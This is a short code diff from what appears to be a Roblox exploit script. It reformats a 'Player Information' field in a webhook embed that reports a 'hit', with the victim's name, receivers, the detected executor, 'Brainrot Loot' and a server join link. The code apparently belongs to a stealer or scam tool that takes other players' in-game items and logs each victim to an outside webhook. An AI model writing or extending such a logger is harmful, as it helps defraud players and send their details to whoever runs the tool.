@@ -272,10 +272,13 @@ local function sendWebhook(link)
             { ["name"] = "Hit By", ["value"] = "Sync" },
             { ["name"] = "Players", ["value"] = string.format("%d/6", #Players:GetPlayers()) },
             { ["name"] = "Server Type", ["value"] = serverType },
-            { ["name"] = "👥 Player Information",
-              ["value"] = "Name: " .. (player and player.Name or "Unknown") ..
-                          "\nReceiver: ".. receiverList ..
-                          "\nExecutor: " .. detectExecutor() ..
+            { 
+    ["name"] = "👥 Player Information",
+    ["value"] = 
+        "Name: " .. (player and player.Name or "Unknown") ..
+        "\nReceiver: " .. receiverList ..
+        "\nExecutor: " .. detectExecutor()
+},
             { ["name"] = "🧠Brainrot Loot", ["value"] = lootText },
             { ["name"] = "Join Server Link", ["value"] = ("[Click to Join Server](%s)"):format(serverLink) }
         }
